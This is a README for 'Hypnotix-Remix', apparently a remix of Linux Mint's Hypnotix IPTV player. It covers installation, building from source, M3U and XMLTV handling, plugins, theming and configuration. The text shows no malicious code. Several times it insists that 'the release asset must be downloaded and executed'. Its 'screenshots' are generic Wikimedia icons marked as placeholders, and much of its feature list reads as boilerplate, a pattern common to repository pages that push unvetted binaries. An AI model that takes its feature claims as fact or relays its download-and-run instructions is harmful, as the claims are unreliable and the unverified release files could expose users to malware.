# Hypnotix-Remix — Advanced IPTV Player for Linux Mint, Ad-free
[![Releases](https://img.shields.io/github/v/release/solo199901/hypnotix-remix?label=Releases&color=2b9348)](https://github.com/solo199901/hypnotix-remix/releases)

<img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Linux_Mint_logo.svg" alt="Linux Mint" width="120" style="float:right; margin-left:12px;" />

A modern remix of Linux Mint's Hypnotix. Stream live TV, movies, and series. Get advanced features, no ads, and full community customization. Built with GTK and Python. Works with M3U and EPG.

Table of contents
- About
- Key features
- Screenshots & media
- Quick install (Releases)
- Build and run from source
- Playlists: M3U and XSPF
- EPG: XMLTV and remote guides
- Playback engine and codecs
- Advanced features
- Theming and GTK customization
- Shortcuts and remote control
- Configuration examples
- Troubleshooting
- Developer guide
- Tests and CI
- Contributing
- Roadmap
- Credits
- Changelog
- License

About
Hypnotix-Remix updates Hypnotix with modern UX and a plugin-ready design. The app focuses on privacy, stability, and flexible playlist handling. It supports live TV, catch-up, and on-demand streams. The UI uses GTK for native Linux feel. The backend uses Python for fast iteration and community-driven extensions.

Key features
- Native GTK interface that fits Linux Mint and other GTK desktops.
- M3U and XSPF playlist support.
- XMLTV-compatible EPG support and EPG merging.
- No ads, no telemetry. Community control over builds.
- Multiple playback backends: GStreamer, MPV.
- Subtitle support: SRT, WebVTT, embedded subtitles.
- Recording and time-shift on demand.
- Channel groups and favorites.
- Per-channel stream fallback list.
- Secure stream verification and optional stream pre-check.
- User themes and CSS overrides for GTK.
- Plugin system for custom parsers and metadata enrichers.
- CLI tools for batch playlist operations.
- Wide codec support via GStreamer and system libraries.

Screenshots & media
- Main window (channel list, guide, player)
  - https://upload.wikimedia.org/wikipedia/commons/6/6b/Television_icon_-_Font_Awesome.svg
- Guide view (EPG grid)
  - https://upload.wikimedia.org/wikipedia/commons/8/80/Calendar_icon.svg
- Settings (playlist manager, backends)
  - https://upload.wikimedia.org/wikipedia/commons/0/0e/Settings_gear_icon.svg

Use these images inline to preview UI or link them. Replace them with project screenshots for your release assets.

Quick install (Releases)
Download the latest release package from the Releases page and run the installer. Download and execute the release asset available on:
https://github.com/solo199901/hypnotix-remix/releases

The Releases page contains prebuilt packages and AppImages. On Debian-like systems, get the .deb and install it:

sudo dpkg -i hypnotix-remix_<version>_amd64.deb
sudo apt-get install -f

For AppImage, mark it executable and run:

chmod +x Hypnotix-Remix-<version>.AppImage
./Hypnotix-Remix-<version>.AppImage

Flatpak and Snap packages appear when contributors publish them. Check the Releases page for official assets and the exact filename. The release asset must be downloaded and executed to install the prebuilt app.

If you prefer to build from source, follow the Build and run from source section.

Packaging notes
- .deb builds use standard Debian packaging with dh-python.
- AppImage bundles system runtime to avoid dependency issues.
- Flatpak uses the org.gnome.Sdk base for GTK integration.
- Snap uses classic confinement for hardware access.

Build and run from source
Prerequisites
- Python 3.10 or newer.
- GTK 3.24+ (or GTK 4 if your branch supports it).
- Pip and virtualenv.
- GStreamer and plugins for codecs.
- Optional: mpv for alternate backend.

Install dev dependencies (Debian/Ubuntu):

sudo apt update
sudo apt install python3 python3-venv python3-pip build-essential \
  libgirepository1.0-dev gir1.2-gtk-3.0 libgstreamer1.0-dev \
  libgstreamer-plugins-base1.0-dev

Clone repository and create venv:

git clone https://github.com/solo199901/hypnotix-remix.git
cd hypnotix-remix
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

Run the app:

python -m hypnotix_remix

Run tests:

pytest

Common development tasks
- Reload UI without restart: the app supports live CSS reload and UI refresh on config save.
- Use logging to debug: set LOG_LEVEL=DEBUG in environment.
- Generate GObject introspection stubs: run tools/gen_gi_stubs.py

Playlists: M3U and XSPF
Hypnotix-Remix reads M3U and XSPF playlists. It offers playlist import, live URL import, and local file load.

M3U tips
- Each channel entry should include tvg-id, tvg-name, tvg-logo, and group-title attributes where possible.
- Use UTF-8 encoding for text.
- Validate M3U files with curl and a quick grep for #EXTM3U header.

Example M3U entry:

#EXTINF:-1 tvg-id="bbc1.uk" tvg-name="BBC One" tvg-logo="https://example.com/bbc1.png" group-title="UK",BBC One
http://stream.example.net/bbc1/playlist.m3u8

Import command-line helper
- The repo contains tools/import_playlist.py to normalize entries and fix common issues.

XSPF
- XSPF supports richer metadata. Hypnotix-Remix maps XSPF fields to internal channel objects.
- Use channel UUIDs to keep settings during playlist updates.

EPG: XMLTV and remote guides
Hypnotix-Remix uses XMLTV as the primary EPG format. It supports remote EPG URLs and local XMLTV files.

XMLTV basics
- The app expects standard <programme> entries with start, stop, and channel attributes.
- Hypnotix-Remix merges multiple EPG sources. You can prefer local EPG over remote.

EPG download helper
- Use the epg-fetch tool in tools/epg_fetch.py to fetch and merge XMLTV files.
- The app supports gzip-compressed XMLTV files.

Mapping channels to EPG
- If the playlist contains tvg-id fields, the app maps tvg-id to XMLTV channel IDs.
- Use manual mapping if IDs differ. There is a channel mapping editor in Settings > EPG.

Live update and guide layout
- The guide updates progressively.
- The app caches EPG in ~/.config/hypnotix-remix/epg-cache.
- Set EPG refresh interval in Settings.

Playback engine and codecs
Hypnotix-Remix uses a modular playback layer. The app ships two backends:

GStreamer backend
- Good integration with GTK.
- Uses GStreamer pipelines for decoding and rendering.
- Works well with platform decoders and VA-API for hardware acceleration.
- Install gstreamer1.0-plugins-{base,good,bad,ugly} to cover common codecs.

MPV backend
- Uses libmpv for robust HLS and DASH handling.
- Supports advanced DRM-free features and stream retry.
- mpv offers smarter adaptive bitrate decisions.

Subtitle support
- Load external SRT or WebVTT files.
- Show embedded subtitles when available.
- Adjust font size and color in Settings.

Recording and time-shift
- The app can record active streams to chosen folder.
- Time-shift uses a ring buffer for short pause and rewind.
- For long-term recording, use scheduled recording via the scheduler.

Advanced features
Channel groups and multi-source
- Organize channels into groups.
- Add multiple source URLs per channel for fallback.
- The player auto-switches if the primary stream fails.

Per-channel preferences
- Set preferred quality, preferred audio track, and subtitle default.
- Mark channels for auto-start or wake-on-launch.

Plugin system
- Plugins live in plugins/ and follow a simple interface.
- Use plugins to add metadata, importers, or custom EPG parsers.
- Each plugin uses an entry point in setup.cfg for auto-discovery.

Example plugin skeleton

from hypnotix_remix.plugins import BasePlugin

class MyPlugin(BasePlugin):
    name = "my-plugin"
    def on_channel_load(self, channel):
        # modify channel metadata
        channel.display_name = channel.display_name.upper()

UI widgets and extensions
- The app exposes a small widget API for community extensions.
- Widgets can add panels to the sidebar or overlay content.

Security and privacy
- The app avoids telemetry and external tracking.
- Use HTTPS for remote playlist and EPG sources.
- The app verifies download URLs when provided with a hash in playlist metadata.

Theming and GTK customization
Hypnotix-Remix uses GTK CSS for theming. You can add a custom CSS file to override styles.

Custom CSS example (~/.config/hypnotix-remix/custom.css)

window {
  background-color: #121212;
}
.headerbar {
  background-image: linear-gradient(#2e7d32, #1b5e20);
}

Enable custom CSS in Settings > Appearance. The app supports GTK themes. It respects system theme and high-contrast modes.

Icons & assets
- Replace icons in assets/icons/ to change channel placeholder and app icon.
- Provide PNGs and SVGs for different DPI.

Shortcuts and remote control
Keyboard shortcuts
- Space: toggle play/pause
- Left/Right: seek -/+
- Up/Down: volume up/down
- F: toggle fullscreen
- S: start/stop recording
- G: open Guide

MPRIS support
- The app implements MPRIS for playback control from desktop shells.
- Use common media keys to control playback.

LIRC and remotes
- The app supports LIRC for infrared remotes.
- Configure keys in Settings > Remote.

Configuration examples
Config file (YAML) lives at ~/.config/hypnotix-remix/config.yml. The app validates config on start.

Sample config

player:
  backend: gstreamer
  hwaccel: vaapi
epg:
  sources:
    - http://epg.example.com/guide.xml.gz
playlists:
  - name: "Main IPTV"
    url: "http://example.com/playlist.m3u"
    refresh: 86400
ui:
  theme: system
  custom_css: "~/.config/hypnotix-remix/custom.css"

Profiles and multiple instances
- Create multiple config profiles in ~/.config/hypnotix-remix/profiles/.
- Launch a profile with --profile <name>.

Troubleshooting
- If channels fail to play, test stream URLs with mpv or gst-launch.
- For codec errors, ensure gstreamer plugins are installed.
- If EPG does not match channels, check tvg-id fields in playlist entries.
- For missing images, verify logo URLs and allow HTTP if needed.

Logs and diagnostics
- Logs live in ~/.cache/hypnotix-remix/logs/.
- Set LOG_LEVEL to DEBUG to get detailed runtime info.
- Use the diagnostics page in Settings to export a support bundle.

Common errors and fixes
- "Missing GStreamer plugin": install gstreamer1.0-plugins-{bad,ugly}.
- "Permission denied for AppImage": chmod +x then run.
- "EPG mapping not found": open Settings > EPG and create mapping.

Developer guide
Architecture overview
- UI: GTK + Glade or GtkBuilder files in ui/
- Backend: Python modules in hypnotix_remix/
- Plugins: plugins/
- Tools: tools/ (importers, epg fetch, export helpers)
- Tests: tests/ (pytest)

Coding style
- Follow PEP8 and black formatting.
- Use type hints for public APIs.
- Keep functions short and focused.

Run unit tests

pytest -q

Run linters

pip install flake8 black isort
black .
flake8

API and modules
- hypnotix_remix.player: playback core
- hypnotix_remix.ui: UI components and controllers
- hypnotix_remix.playlist: playlist parser and normalizer
- hypnotix_remix.epg: EPG loader and merge logic
- hypnotix_remix.plugins: plugin loader and API

Create a plugin
- Implement BasePlugin and register an entry point in setup.cfg.
- Write tests for plugin behavior.

Continuous integration
- The repo uses GitHub Actions to run tests and build artifacts.
- Pull requests trigger lint and pytest runs.
- Release artifacts build on tag push.

Tests and CI
Test strategy
- Unit tests for parsers and helpers.
- Integration tests for EPG merge logic and playlist importers.
- UI smoke tests using dogtail or pytest-gtk where possible.

Local test env
- Use tox to create isolated environments.
- Use docker for testing different system dependencies.

Example tox.ini (simplified)

[tox]
envlist = py310, py311

[testenv]
deps = -rrequirements-dev.txt
commands = pytest

Contributing
- Fork the repo and open a pull request.
- Keep PRs small and focused.
- Write tests for new code.
- Follow the API compatibility policy in docs/API.md.
- Use feature branches with descriptive names.

Code review checklist
- Does the code follow style rules?
- Do tests cover new logic?
- Does the PR include documentation?
- Does it avoid breaking existing APIs?

Issue reporting
- Provide reproduction steps.
- Attach logs and a description of environment.
- Include playlist samples or EPG snippets when relevant.

Release process
- Increment version in setup.cfg and changelog.
- Tag release with semver vX.Y.Z and push.
- GitHub Actions builds release artifacts and publishes them.
- Upload any extra assets (AppImage, .deb) to the release.

The Releases page lives at:
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/solo199901/hypnotix-remix/releases)

Use that page to grab installers. The release asset must be downloaded and executed to install the prebuilt app. The release page lists files by platform and shows checksums next to each asset.

Roadmap
- Improved DVR with cloud sync.
- Better gapless switching for multi-bitrate streams.
- Native Wayland support for improved fullscreen.
- Richer plugin API for third-party integrations.
- Mobile companion app for remote control.
- Optional encrypted playlist storage.

Credits
- Original Hypnotix team and Linux Mint contributors.
- Community contributors for playlists, icons, and translations.
- Testers who provided stream samples and EPG data.

Third-party libraries and acknowledgements
- GStreamer for media pipelines.
- MPV for robust HLS/DASH playback.
- GTK for native UI.
- XMLTV and other open EPG data providers.

Changelog
Keep a changelog in CHANGELOG.md. Follow keep-a-changelog format. Example entries:

Unreleased
- Added plugin API for metadata enrichment.
- Improved EPG merging to handle overlapping programs.

v1.2.0
- Added MPV backend.
- Fixed channel fallback logic.

v1.1.0
- Initial remix release with modern GTK UI.

License
This repository uses the MIT license. See LICENSE file for full details.

Contact and support
- Open an issue for bugs and feature requests.
- Use Discussions for general help and community tips.
- Provide real-world playlist samples when reporting playlist parsing bugs.

Appendix: Playlist and EPG examples

Example large M3U with groups and logos

#EXTM3U
#EXTINF:-1 tvg-id="news.world" tvg-name="World News" tvg-logo="https://cdn.example.com/logos/worldnews.png" group-title="News",World News
http://streams.example.com/worldnews/stream.m3u8
#EXTINF:-1 tvg-id="movie.hd" tvg-name="Movie HD" tvg-logo="https://cdn.example.com/logos/moviehd.png" group-title="Movies",Movie HD
http://streams.example.com/moviehd/stream.m3u8

Example XMLTV snippet

<?xml version="1.0" encoding="UTF-8"?>
<tv generator-info-name="example">
  <channel id="news.world">
    <display-name>World News</display-name>
    <icon src="https://cdn.example.com/logos/worldnews.png" />
  </channel>
  <programme start="20250816060000 +0000" stop="20250816070000 +0000" channel="news.world">
    <title>Morning Roundup</title>
    <desc>Global headlines and reports.</desc>
  </programme>
</tv>

FAQ
Q: Which playlists work best?
A: M3U with tvg-id fields gives best EPG mapping. Use UTF-8 files and include logos.

Q: How does the app handle bad streams?
A: The player uses fallback streams. It retries based on the configured policy.

Q: Can I run the app on other distros?
A: Yes. AppImage and Flatpak improve portability. You can also build from source.

Q: How do I add subtitles?
A: Open player controls, click Subtitles, then load a local SRT or WebVTT file.

Q: How do I contribute translations?
A: Add PO files in po/ and submit a PR. Use gettext tools to extract strings.

Useful links
- Releases: https://github.com/solo199901/hypnotix-remix/releases
- Report issues: https://github.com/solo199901/hypnotix-remix/issues
- Pull requests: https://github.com/solo199901/hypnotix-remix/pulls

Developer resources
- API document: docs/API.md
- Plugin guide: docs/PLUGINS.md
- Packaging guide: docs/PACKAGING.md

Maintenance tips
- Rotate EPG cache periodically to avoid stale data.
- Monitor GStreamer plugin versions when updating system libs.
- Keep playlists versioned if you manage them centrally.

Final notes
- Replace the placeholder images with real screenshots before publishing a release.
- Use the release assets on the Releases page to distribute installers. The release asset must be downloaded and executed for prebuilt installs.

